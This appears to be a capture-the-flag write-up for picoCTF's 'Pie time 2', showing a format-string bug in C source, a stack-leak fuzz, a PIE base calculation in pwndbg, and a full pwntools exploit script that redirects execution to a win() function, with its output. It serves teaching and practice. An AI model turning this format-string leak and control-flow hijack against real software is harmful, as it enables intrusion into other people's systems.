---
title: "Pie time 2"
date: "2025-07-21"
tags: ["picoCTF", "PIE", "format string"]
---

In this challenge they give us a binary and its C source.

```c
./vuln        
Enter your name:%p
0xa70
 enter the address to jump to, ex => 0x12345: 0x0
Segfault Occurred, incorrect address.
```

The program lets me enter some input and then asks for an address to jump to.

The binary has a format string vulnerability:

```c
printf("Enter your name:");
fgets(buffer, 64, stdin);
printf(buffer);
```

The program has a win function called `win`:

```c
int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}
```

It looks simple, I just have to pass the address of the `win` function to solve the challenge. But there is a problem, the binary has `PIE` enabled:

```c
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

First I have to find out the base address of the binary. For that I can use the format string to leak the address of one of the program instructions.

I can use a fuzzer to pull addresses off the stack and look for one that works. To avoid trying everything that shows up, the interesting addresses usually start with 555 or are close to it.

```c
. . .
1: b'AAAAAAA0x3125414141414141\n'  // Parametro controlable
. . .
4: b'AAAAAAA0x5555555592ac\n' // Interesante
. . .
19: b'AAAAAAA0x555555555441\n' // Intereante
. . .
```

```c
pwndbg> info symbol 0x555555555441
main + 65 in section .text of /home/ub1cu0/Desktop/picoCTF/pie_time_2/vuln_patched
```

This one works! Let's work out an offset so pwntools can know where the base of the binary is:

```c
pwndbg> piebase
Calculated VA from /home/ub1cu0/Desktop/picoCTF/pie_time_2/vuln_patched = 0x555555554000

offset = 0x555555555441 - 0x555555554000 = 0x1441
```

Now I can write the script:

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF('./vuln_patched')
context.binary = exe

LEAK_OFFSET = 0x1441

def conn():
    if args.LOCAL:
        return process([exe.path])
    return remote('rescued-float.picoctf.net', 65508)

def main():
    r = conn()

    format = b'%p ' * 19
    r.sendlineafter(b'Enter your name:', format)

    leak_line = r.recvline().decode().strip()
    leak      = leak_line.split()[18]
    log.info(f'Leak: {leak}')

    pie_base = int(leak, 16) - LEAK_OFFSET
    exe.address = pie_base
    win = exe.symbols.win
    log.info(f'PIE base: {hex(pie_base)}')
    log.info(f'win() addr: {hex(win)}')

    r.sendline(hex(win).encode())

    r.interactive()

if __name__ == '__main__':
    main()
```

```c
   ~/Desktop/picoCTF/pie_time_2 ❯ python3 solve.py      
[*] '/home/ub1cu0/Desktop/picoCTF/pie_time_2/vuln_patched'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Opening connection to rescued-float.picoctf.net on port 59789: Done
[*] Leak: 0x5910d83d6441
[*] PIE base: 0x5910d83d5000
[*] win() addr: 0x5910d83d636a
[*] Switching to interactive mode
 enter the address to jump to, ex => 0x12345: You won!
picoCTF{SECRETO}
```

I have the flag!
